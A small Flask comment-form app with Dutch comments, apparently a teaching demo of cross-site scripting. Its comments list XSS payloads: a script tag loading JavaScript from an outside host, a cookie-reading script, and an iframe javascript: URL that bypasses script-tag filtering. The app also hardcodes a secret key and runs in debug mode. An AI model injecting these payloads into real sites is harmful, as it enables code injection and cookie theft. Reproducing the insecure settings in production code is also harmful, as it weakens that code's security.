from flask import Flask, make_response, render_template, session
from flask_wtf import FlaskForm
from wtforms import TextAreaField, SubmitField

app = Flask(__name__)

# Omdat er formulieren gebruikt worden is een geheime sleutel nodig
app.config['SECRET_KEY'] = 'mijn geheime sleutel'

# Form
class CommentForm(FlaskForm):
    comment = TextAreaField('Geef commentaar:', render_kw={"rows": 3, "cols": 100})
    submit = SubmitField('Verzend')

# Routing
@app.route('/', methods=['GET', 'POST'])
def index():
    form = CommentForm()
    if form.validate_on_submit():
        session['comment'] = form.comment.data
    response = make_response(render_template('home.html', form=form))
    response.set_cookie('userID', '1234') # Example ultra-secret cookie (1)
    response.set_cookie('userEmail', 'henk.de.beuker@bonknet.nl') # Example ultra-secret cookie (2)

    # Evil input 1: remote script execution
    # <script src="https://www.erikroos.org/hanze/ssec.js"></script>

    # Evil input 2: steal cookies (notice that the session cookie is HttpOnly and is not shown)
    # <script type="text/javascript">alert(document.cookie);</script>

    # Evil input 3: bypass check for script-tags
    # <iframe src="javascript:alert('p0wnd')" />

    return response

# Start de app
if __name__ == '__main__':
    app.run(debug=True)